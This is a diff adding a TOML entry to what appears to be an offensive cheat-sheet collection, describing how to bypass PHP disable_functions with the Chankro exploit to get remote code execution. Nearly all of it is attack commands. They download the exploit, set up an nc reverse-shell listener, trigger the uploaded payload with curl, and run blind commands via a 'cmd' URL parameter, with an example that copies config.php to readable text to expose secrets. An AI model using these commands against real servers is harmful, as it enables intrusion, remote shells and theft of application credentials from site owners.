@@ -1,0 +1,21 @@
+title = "PHP disable_functions bypass with Chankro to get RCE"
+description = "Get a reverse shell on PHP applications even when system functions are disabled"
+tags = ["php", "bypass", "web"]
+source = ["https://github.com/Nickguitar/Chankro"]
+
+[[data]]
+description = "Download the exploit, change the IP and port on the payload (line 21) and upload it to the server. The code will exploit the sendmail binary through the PHP mail() function."
+language = "bash"
+command = """#Change IP and port and upload it
+wget https://raw.githubusercontent.com/Nickguitar/Chankro/master/chankro.php
+
+#Set up your listener on the chosen port
+nc -lnvp <PORT>
+
+#Make a GET request to the exploit to receive the shell
+curl https://example.com/chankro.php"""
+
+[[data]]
+description = "Alternatively, set the GET parameter 'cmd' and run commands direct via the URL (blind)"
+language = "bash"
+command = """curl 'https://example.com/chankro.php?cmd=cp+config.php+config.txt'"""
